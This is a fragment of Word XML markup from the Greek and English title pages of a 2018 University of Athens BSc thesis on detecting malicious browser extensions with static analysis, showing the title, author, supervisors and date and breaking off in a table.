      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t xml:space="preserve">Ανιχνεύοντας </w:t>
      </w:r>
      <w:r w:rsidR="00C37191" w:rsidRPr="005B5B30">
        <w:rPr>
          <w:b/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t xml:space="preserve">Κακόβουλες Επεκτάσεις </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t>Φυλλομετρητών με Στατική Ανάλυση</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C4F2D59" w14:textId="77777777" w:rsidR="0017020F" w:rsidRPr="005B5B30" w:rsidRDefault="0017020F" w:rsidP="0017020F">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="748B8A4B" w14:textId="77777777" w:rsidR="0017020F" w:rsidRPr="005B5B30" w:rsidRDefault="0017020F" w:rsidP="0017020F">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="28454CB8" w14:textId="77777777" w:rsidR="0017020F" w:rsidRPr="005B5B30" w:rsidRDefault="0017020F" w:rsidP="0017020F">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="059CF0DC" w14:textId="77777777" w:rsidR="0017020F" w:rsidRPr="00080625" w:rsidRDefault="008A44E0" w:rsidP="008A44E0">
      <w:pPr>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ηλίας Α. Ραφαήλ</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70D0DC5E" w14:textId="77777777" w:rsidR="0017020F" w:rsidRPr="00501B0B" w:rsidRDefault="0017020F" w:rsidP="0017020F">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="17A3080C" w14:textId="77777777" w:rsidR="0017020F" w:rsidRPr="00501B0B" w:rsidRDefault="0017020F" w:rsidP="0017020F">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="64787E9D" w14:textId="77777777" w:rsidR="0017020F" w:rsidRPr="00501B0B" w:rsidRDefault="0017020F" w:rsidP="0017020F">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7D9E2718" w14:textId="77777777" w:rsidR="0017020F" w:rsidRDefault="0017020F" w:rsidP="0017020F">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="374ED0A9" w14:textId="77777777" w:rsidR="009B5896" w:rsidRDefault="009B5896" w:rsidP="0017020F">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="65A7B07E" w14:textId="77777777" w:rsidR="009B5896" w:rsidRPr="00501B0B" w:rsidRDefault="009B5896" w:rsidP="0017020F">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D2ACE74" w14:textId="77777777" w:rsidR="0017020F" w:rsidRPr="00BC42AE" w:rsidRDefault="0017020F" w:rsidP="0017020F">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1E3F1B93" w14:textId="77777777" w:rsidR="00F243DA" w:rsidRPr="00BC42AE" w:rsidRDefault="00F243DA" w:rsidP="0017020F">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2028"/>
        <w:gridCol w:w="7543"/>
      </w:tblGrid>
      <w:tr w:rsidR="009B5896" w:rsidRPr="00472A24" w14:paraId="5DC4317F" w14:textId="77777777" w:rsidTr="002D335C">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2028" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="76118B60" w14:textId="77777777" w:rsidR="009B5896" w:rsidRPr="002D335C" w:rsidRDefault="00523C30" w:rsidP="002D335C">
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:b/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00523C30">
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Επιβλέπων:</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="7543" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="075E5804" w14:textId="77777777" w:rsidR="00F25C20" w:rsidRPr="00F25C20" w:rsidRDefault="00E34D88" w:rsidP="009924AB">
            <w:pPr>
              <w:tabs>
                <w:tab w:val="left" w:pos="1980"/>
              </w:tabs>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:ins w:id="3" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:26:00Z"/>
                <w:b/>
                <w:lang w:val="el-GR"/>
                <w:rPrChange w:id="4" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:26:00Z">
                  <w:rPr>
                    <w:ins w:id="5" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:26:00Z"/>
                    <w:lang w:val="el-GR"/>
                  </w:rPr>
                </w:rPrChange>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005B5B30">
              <w:rPr>
                <w:b/>
                <w:lang w:val="el-GR"/>
              </w:rPr>
              <w:t>Δημήτρης Μητρόπουλος</w:t>
            </w:r>
            <w:r w:rsidR="009B5896" w:rsidRPr="005B5B30">
              <w:rPr>
                <w:b/>
                <w:lang w:val="el-GR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r w:rsidR="009924AB" w:rsidRPr="00F25C20">
              <w:rPr>
                <w:b/>
                <w:lang w:val="el-GR"/>
                <w:rPrChange w:id="6" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:26:00Z">
                  <w:rPr>
                    <w:lang w:val="el-GR"/>
                  </w:rPr>
                </w:rPrChange>
              </w:rPr>
              <w:t>Επισκέπτης Καθηγητής</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1A1CCBD4" w14:textId="49635197" w:rsidR="009B5896" w:rsidRPr="009924AB" w:rsidRDefault="009924AB" w:rsidP="009924AB">
            <w:pPr>
              <w:tabs>
                <w:tab w:val="left" w:pos="1980"/>
              </w:tabs>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:b/>
                <w:lang w:val="el-GR"/>
              </w:rPr>
            </w:pPr>
            <w:del w:id="7" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:26:00Z">
              <w:r w:rsidRPr="00F25C20" w:rsidDel="00F25C20">
                <w:rPr>
                  <w:b/>
                  <w:lang w:val="el-GR"/>
                  <w:rPrChange w:id="8" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:26:00Z">
                    <w:rPr>
                      <w:lang w:val="el-GR"/>
                    </w:rPr>
                  </w:rPrChange>
                </w:rPr>
                <w:delText xml:space="preserve"> </w:delText>
              </w:r>
            </w:del>
            <w:r w:rsidRPr="00F25C20">
              <w:rPr>
                <w:b/>
                <w:lang w:val="el-GR"/>
                <w:rPrChange w:id="9" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:26:00Z">
                  <w:rPr>
                    <w:lang w:val="el-GR"/>
                  </w:rPr>
                </w:rPrChange>
              </w:rPr>
              <w:t>Αλέξης Δελής, Καθηγητής</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4AABB8CB" w14:textId="77777777" w:rsidR="00F243DA" w:rsidRPr="005B5B30" w:rsidRDefault="00F243DA" w:rsidP="0017020F">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="38DD0D8D" w14:textId="77777777" w:rsidR="00501B0B" w:rsidRPr="005B5B30" w:rsidRDefault="00501B0B" w:rsidP="00255E9A">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1985"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="135DB0D8" w14:textId="77777777" w:rsidR="0017020F" w:rsidRPr="005B5B30" w:rsidRDefault="0017020F" w:rsidP="0017020F">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C56010D" w14:textId="77777777" w:rsidR="00F243DA" w:rsidRPr="005B5B30" w:rsidRDefault="00F243DA" w:rsidP="0017020F">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A72F423" w14:textId="77777777" w:rsidR="00F243DA" w:rsidRPr="005B5B30" w:rsidRDefault="00F243DA" w:rsidP="0017020F">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="070CC733" w14:textId="77777777" w:rsidR="0017020F" w:rsidRPr="005B5B30" w:rsidRDefault="0017020F" w:rsidP="0017020F">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="104292E6" w14:textId="77777777" w:rsidR="002F71E3" w:rsidRPr="005B5B30" w:rsidRDefault="002F71E3" w:rsidP="0017020F">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="650A2AD7" w14:textId="77777777" w:rsidR="0017020F" w:rsidRPr="005B5B30" w:rsidRDefault="0017020F" w:rsidP="0017020F">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="521A572A" w14:textId="77777777" w:rsidR="0017020F" w:rsidRPr="00210431" w:rsidRDefault="0017020F" w:rsidP="0017020F">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00080625">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ΑΘΗΝΑ</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="578ED706" w14:textId="77777777" w:rsidR="0017020F" w:rsidRPr="00210431" w:rsidRDefault="0017020F" w:rsidP="0017020F">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1DDBE92F" w14:textId="77777777" w:rsidR="0017020F" w:rsidRPr="0009390C" w:rsidRDefault="00481D34" w:rsidP="0017020F">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ΙΟΥΝΙΟΣ</w:t>
      </w:r>
      <w:r w:rsidR="0017020F" w:rsidRPr="00210431">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0009390C">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2018</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="188D680C" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="00210431" w:rsidRDefault="008E42C1" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00210431">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="03DD6224" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="00210431" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F0AA105" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="00210431" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="35D02185" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="00210431" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0CA2C9F4" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>BSc THESIS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C2A58ED" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5FA25A48" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="726E625B" w14:textId="5A1A5B65" w:rsidR="002D2B00" w:rsidRPr="00B45006" w:rsidRDefault="0047028D" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Detecting </w:t>
      </w:r>
      <w:r w:rsidR="00B45006" w:rsidRPr="00B45006">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Malicious </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Browser</w:t>
      </w:r>
      <w:r w:rsidR="00B45006" w:rsidRPr="00B45006">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> Extensions</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> with Static Analysis</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FC033F9" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B96951F" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3AE3B2E9" w14:textId="77777777" w:rsidR="00B45006" w:rsidRPr="009A14F1" w:rsidRDefault="00B45006" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="fr-FR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009A14F1">
        <w:rPr>
          <w:b/>
          <w:lang w:val="fr-FR"/>
        </w:rPr>
        <w:t xml:space="preserve">ILIAS A. RAFAIL </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C5356A8" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="009A14F1" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="fr-FR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009A14F1">
        <w:rPr>
          <w:b/>
          <w:lang w:val="fr-FR"/>
        </w:rPr>
        <w:t>S.N.:</w:t>
      </w:r>
      <w:r w:rsidRPr="009A14F1">
        <w:rPr>
          <w:lang w:val="fr-FR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B45006" w:rsidRPr="009A14F1">
        <w:rPr>
          <w:lang w:val="fr-FR"/>
        </w:rPr>
        <w:t>1115201300149</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="343045D8" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="009A14F1" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="fr-FR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3AF44F01" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="009A14F1" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="fr-FR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4987A38B" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="009A14F1" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="fr-FR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7399DE97" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="009A14F1" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="fr-FR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="70FD318D" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="009A14F1" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="fr-FR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3C62E13D" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="009A14F1" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="fr-FR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3867B41B" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="009A14F1" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="fr-FR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7D754C91" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="009A14F1" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="fr-FR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="180751F0" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="009A14F1" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="fr-FR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6BDF1005" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="009A14F1" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="fr-FR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6776739E" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="009A14F1" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="fr-FR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="463E7281" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="009A14F1" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="fr-FR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="64BB8D3D" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="009A14F1" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="fr-FR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A2636DA" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="009A14F1" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="fr-FR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77130CED" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="009A14F1" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="fr-FR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="30E3E818" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="009A14F1" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="fr-FR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2174"/>
        <w:gridCol w:w="7397"/>
      </w:tblGrid>
      <w:tr w:rsidR="002D2B00" w:rsidRPr="002D335C" w14:paraId="129AC416" w14:textId="77777777" w:rsidTr="0014551D">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2174" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="324BAE45" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D335C" w:rsidRDefault="002D2B00" w:rsidP="0014551D">
            <w:pPr>
              <w:tabs>
                <w:tab w:val="left" w:pos="1980"/>
              </w:tabs>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:b/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002D2B00">
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>SUPERVISOR</w:t>
            </w:r>
            <w:r w:rsidRPr="002D335C">
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="7397" w:type="dxa"/>
